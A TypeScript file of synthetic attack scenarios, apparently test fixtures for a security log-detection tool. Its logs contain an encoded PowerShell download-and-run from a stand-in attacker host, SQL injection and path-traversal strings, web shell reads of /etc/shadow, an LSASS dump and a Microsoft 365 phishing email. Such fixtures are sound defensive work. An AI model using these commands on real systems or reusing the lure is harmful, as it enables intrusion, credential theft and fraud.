export interface SampleScenario {
  id: string;
  name: string;
  category: string;
  description: string;
  rawLog: string;
  expectedAlertCount: number;
  highlightedThreat: string;
}

export const SAMPLE_SCENARIOS: SampleScenario[] = [
  {
    id: "scenario-apt-multistage",
    name: "Multi-Stage Cyber Intrusion (APT-Style Chain)",
    category: "Advanced Persistent Threat",
    highlightedThreat: "Brute Force -> Credential Compromise -> Privilege Escalation -> Encoded PowerShell -> C2 Beaconing",
    expectedAlertCount: 5,
    description: "Complete multi-phase attack chain on corporate finance server FIN-SRV-01 originating from external IP 185.220.101.5.",
    rawLog: `2026-08-16T03:10:02Z host=FIN-SRV-01 src_ip=185.220.101.5 dst_ip=10.0.4.15 proto=tcp src_port=51234 dst_port=22 user=admin process=sshd status=FAILURE msg="Failed password for invalid user admin from 185.220.101.5 port 51234 ssh2"
2026-08-16T03:10:07Z host=FIN-SRV-01 src_ip=185.220.101.5 dst_ip=10.0.4.15 proto=tcp src_port=51238 dst_port=22 user=root process=sshd status=FAILURE msg="Failed password for root from 185.220.101.5 port 51238 ssh2"
2026-08-16T03:10:14Z host=FIN-SRV-01 src_ip=185.220.101.5 dst_ip=10.0.4.15 proto=tcp src_port=51242 dst_port=22 user=svc_backup process=sshd status=FAILURE msg="Failed password for svc_backup from 185.220.101.5 port 51242 ssh2"
2026-08-16T03:10:22Z host=FIN-SRV-01 src_ip=185.220.101.5 dst_ip=10.0.4.15 proto=tcp src_port=51249 dst_port=22 user=jsmith process=sshd status=FAILURE msg="Failed password for jsmith from 185.220.101.5 port 51249 ssh2"
2026-08-16T03:10:30Z host=FIN-SRV-01 src_ip=185.220.101.5 dst_ip=10.0.4.15 proto=tcp src_port=51255 dst_port=22 user=jsmith process=sshd status=FAILURE msg="Failed password for jsmith from 185.220.101.5 port 51255 ssh2"
2026-08-16T03:10:39Z host=FIN-SRV-01 src_ip=185.220.101.5 dst_ip=10.0.4.15 proto=tcp src_port=51260 dst_port=22 user=jsmith process=sshd status=FAILURE msg="Failed password for jsmith from 185.220.101.5 port 51260 ssh2"
2026-08-16T03:14:11Z host=FIN-SRV-01 src_ip=185.220.101.5 dst_ip=10.0.4.15 proto=tcp src_port=51280 dst_port=22 user=jsmith process=sshd status=SUCCESS msg="Accepted password for jsmith from 185.220.101.5 port 51280 ssh2 - Session opened"
2026-08-16T03:16:45Z host=FIN-SRV-01 src_ip=10.0.4.15 dst_ip=10.0.4.15 user=jsmith process=sudo status=SUCCESS msg="jsmith : TTY=pts/1 ; PWD=/home/jsmith ; USER=root ; COMMAND=/bin/bash -c 'sudo su -'"
2026-08-16T03:18:20Z host=FIN-SRV-01 src_ip=10.0.4.15 dst_ip=10.0.4.15 user=root process=powershell.exe status=FLAGGED msg="powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAtAGMAYwAyAC4AbwByAGcALwBzAHQAYQBnAGUAMgAuAHAAcwAxACcAKQA="
2026-08-16T03:21:05Z host=FIN-SRV-01 src_ip=10.0.4.15 dst_ip=194.26.29.112 proto=tcp src_port=49882 dst_port=4444 user=root process=powershell.exe status=SUCCESS msg="Outbound TCP connection established to 194.26.29.112:4444 (Known CobaltStrike C2 beaconing)"
2026-08-16T03:24:19Z host=FIN-SRV-01 src_ip=10.0.4.15 dst_ip=10.0.4.15 user=root process=rundll32.exe status=FLAGGED msg="rundll32.exe C:\\Windows\\Temp\\mimi.dll,DumpLsass memory dump initiated target=lsass.exe"
2026-08-16T03:26:00Z host=FIN-SRV-01 src_ip=10.0.4.15 dst_ip=194.26.29.112 proto=tcp src_port=49910 dst_port=4444 user=root process=svchost.exe status=SUCCESS msg="Outbound data transfer 42.8 MB to 194.26.29.112:4444"`,
  },
  {
    id: "scenario-windows-ad",
    name: "Windows Active Directory Privilege Escalation & Persistence",
    category: "Windows Event Logs",
    highlightedThreat: "Multiple Failed Logons (4625) -> Successful Admin Logon (4624) -> Special Privileges (4672) -> Malicious Service (7045)",
    expectedAlertCount: 4,
    description: "Intrusion against Domain Controller DC-PROD-01 involving password spraying, token elevation, and backdoored service installation.",
    rawLog: `2026-08-16T04:01:10Z EventID=4625 host=DC-PROD-01 src_ip=45.154.255.82 user=Administrator LogonType=3 status=FAILURE msg="An account failed to log on. SubStatus: 0xc000006a (Bad password)"
2026-08-16T04:01:14Z EventID=4625 host=DC-PROD-01 src_ip=45.154.255.82 user=svc_sql LogonType=3 status=FAILURE msg="An account failed to log on. SubStatus: 0xc000006a (Bad password)"
2026-08-16T04:01:19Z EventID=4625 host=DC-PROD-01 src_ip=45.154.255.82 user=d_admin LogonType=3 status=FAILURE msg="An account failed to log on. SubStatus: 0xc000006a (Bad password)"
2026-08-16T04:01:25Z EventID=4625 host=DC-PROD-01 src_ip=45.154.255.82 user=b_wayne LogonType=3 status=FAILURE msg="An account failed to log on. SubStatus: 0xc000006a (Bad password)"
2026-08-16T04:01:31Z EventID=4625 host=DC-PROD-01 src_ip=45.154.255.82 user=c_kent LogonType=3 status=FAILURE msg="An account failed to log on. SubStatus: 0xc000006a (Bad password)"
2026-08-16T04:02:00Z EventID=4624 host=DC-PROD-01 src_ip=45.154.255.82 user=c_kent LogonType=10 status=SUCCESS msg="An account was successfully logged on via RDP (Logon Type 10) for user c_kent"
2026-08-16T04:02:02Z EventID=4672 host=DC-PROD-01 src_ip=45.154.255.82 user=c_kent status=SUCCESS msg="Special privileges assigned to new logon: SeDebugPrivilege, SeTcbPrivilege, SeSecurityPrivilege"
2026-08-16T04:05:30Z EventID=7045 host=DC-PROD-01 src_ip=10.0.1.10 user=SYSTEM process=services.exe status=FLAGGED msg="A service was installed in the system: ServiceName='WindowsUpdateAgentHelper' ImagePath='C:\\ProgramData\\updater.exe -k run' ServiceType='user mode service'"
2026-08-16T04:08:12Z EventID=4688 host=DC-PROD-01 src_ip=10.0.1.10 user=c_kent process=cmd.exe status=FLAGGED msg="A new process has been created. CommandLine: cmd.exe /c net group \"Domain Admins\" c_kent /add /domain"`,
  },
  {
    id: "scenario-web-sqli",
    name: "Web Application Attack (SQLi & Web Shell Ingestion)",
    category: "Web & Nginx Access Logs",
    highlightedThreat: "SQL Injection Probing -> Path Traversal -> File Upload POST -> Web Shell Execution",
    expectedAlertCount: 3,
    description: "Automated vulnerability scan and exploitation targeting production e-commerce portal WEB-PROD-02.",
    rawLog: `2026-08-16T02:15:10Z host=WEB-PROD-02 src_ip=103.208.220.12 user=anonymous method=GET url="/products?category=electronics" status=200 user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" msg="HTTP 200 OK 4120 bytes"
2026-08-16T02:15:18Z host=WEB-PROD-02 src_ip=103.208.220.12 user=anonymous method=GET url="/products?category=electronics'%20OR%20'1'='1" status=500 user_agent="sqlmap/1.7.2#stable" msg="HTTP 500 Internal Server Error (SQL Syntax error at line 1)"
2026-08-16T02:15:22Z host=WEB-PROD-02 src_ip=103.208.220.12 user=anonymous method=GET url="/products?category=1%20UNION%20SELECT%20null,username,password%20FROM%20users--" status=200 user_agent="sqlmap/1.7.2#stable" msg="HTTP 200 OK Database dump response 8900 bytes"
2026-08-16T02:17:40Z host=WEB-PROD-02 src_ip=103.208.220.12 user=anonymous method=GET url="/../../../../etc/passwd" status=403 user_agent="Nikto/2.1.6" msg="HTTP 403 Forbidden - Path Traversal detected"
2026-08-16T02:20:05Z host=WEB-PROD-02 src_ip=103.208.220.12 user=anonymous method=POST url="/api/v1/upload-avatar" status=200 user_agent="Mozilla/5.0" msg="HTTP 200 OK File uploaded: /var/www/html/uploads/cmd.php (type: application/x-php)"
2026-08-16T02:21:15Z host=WEB-PROD-02 src_ip=103.208.220.12 user=www-data method=GET url="/uploads/cmd.php?cmd=cat%20/etc/shadow" status=200 user_agent="Mozilla/5.0" msg="HTTP 200 OK Web Shell command execution"`,
  },
  {
    id: "scenario-network-portscan",
    name: "Network Reconnaissance & Port Sweep",
    category: "Firewall & IDS Logs",
    highlightedThreat: "Rapid Multi-Port TCP SYN Sweep across Perimeter Subnet",
    expectedAlertCount: 2,
    description: "High-volume external reconnaissance sweep probing critical services across DMZ firewall.",
    rawLog: `2026-08-16T01:00:01Z host=FW-CORP-EDGE src_ip=198.51.100.23 dst_ip=10.0.1.5 proto=tcp src_port=44101 dst_port=21 action=BLOCK status=FAILURE msg="DROP TCP SYN probe from 198.51.100.23:44101 to 10.0.1.5:21 (FTP)"
2026-08-16T01:00:01Z host=FW-CORP-EDGE src_ip=198.51.100.23 dst_ip=10.0.1.5 proto=tcp src_port=44102 dst_port=22 action=BLOCK status=FAILURE msg="DROP TCP SYN probe from 198.51.100.23:44102 to 10.0.1.5:22 (SSH)"
2026-08-16T01:00:02Z host=FW-CORP-EDGE src_ip=198.51.100.23 dst_ip=10.0.1.5 proto=tcp src_port=44103 dst_port=80 action=ALLOW status=SUCCESS msg="ACCEPT TCP SYN probe from 198.51.100.23:44103 to 10.0.1.5:80 (HTTP)"
2026-08-16T01:00:02Z host=FW-CORP-EDGE src_ip=198.51.100.23 dst_ip=10.0.1.5 proto=tcp src_port=44104 dst_port=443 action=ALLOW status=SUCCESS msg="ACCEPT TCP SYN probe from 198.51.100.23:44104 to 10.0.1.5:443 (HTTPS)"
2026-08-16T01:00:03Z host=FW-CORP-EDGE src_ip=198.51.100.23 dst_ip=10.0.1.5 proto=tcp src_port=44105 dst_port=3389 action=BLOCK status=FAILURE msg="DROP TCP SYN probe from 198.51.100.23:44105 to 10.0.1.5:3389 (RDP)"
2026-08-16T01:00:03Z host=FW-CORP-EDGE src_ip=198.51.100.23 dst_ip=10.0.1.5 proto=tcp src_port=44106 dst_port=8080 action=BLOCK status=FAILURE msg="DROP TCP SYN probe from 198.51.100.23:44106 to 10.0.1.5:8080 (HTTP-Alt)"
2026-08-16T01:00:04Z host=FW-CORP-EDGE src_ip=198.51.100.23 dst_ip=10.0.1.5 proto=tcp src_port=44107 dst_port=8443 action=BLOCK status=FAILURE msg="DROP TCP SYN probe from 198.51.100.23:44107 to 10.0.1.5:8443 (HTTPS-Alt)"`,
  },
  {
    id: "scenario-phishing-email",
    name: "Targeted Spearphishing & Credential Harvest Lure",
    category: "Email Gateway & EML",
    highlightedThreat: "Brand Impersonation (Microsoft 365) with Typo-squatted Domain and SPF Softfail",
    expectedAlertCount: 1,
    description: "Urgent security notification spoofing IT support directing employees to fake login portal.",
    rawLog: `Received: from mail-relay.secureserver-notice-m365.com (mail-relay.secureserver-notice-m365.com [193.142.146.88])
    by mx.globalcorp.com with ESMTP id m365_99214; Sun, 16 Aug 2026 04:30:12 -0000
Authentication-Results: mx.globalcorp.com;
    spf=softfail (sender IP 193.142.146.88 does not match spf record for microsoft.com);
    dkim=neutral (no key);
    dmarc=fail (p=reject) header.from=microsoft-security-verify.com
From: "Microsoft 365 Security Team" <security-alerts@microsoft-security-verify.com>
Reply-To: support@secureserver-notice-m365.com
To: victim.user@globalcorp.com
Subject: [URGENT ACTION REQUIRED] Your Microsoft 365 Password Expires in 2 Hours
Date: Sun, 16 Aug 2026 04:30:00 +0000
Content-Type: text/html; charset="UTF-8"

<html>
<body>
<p>Dear GlobalCorp Employee,</p>
<p>Your Microsoft 365 account password has expired. In accordance with IT Security Policy 4.19, you must verify your identity within <strong>120 minutes</strong> or your corporate email and OneDrive access will be terminated immediately.</p>
<p><a href="http://login.microsoftonline.portal-auth-verification-check.com/login.php?user=victim.user@globalcorp.com">Click Here to Retain Your Current Password and Re-verify Account</a></p>
<p>Do not ignore this message.</p>
<p>Global IT Helpdesk & Microsoft Support Services<br>Ticket Reference: #MS-88912-SEC</p>
</body>
</html>`,
  },
];
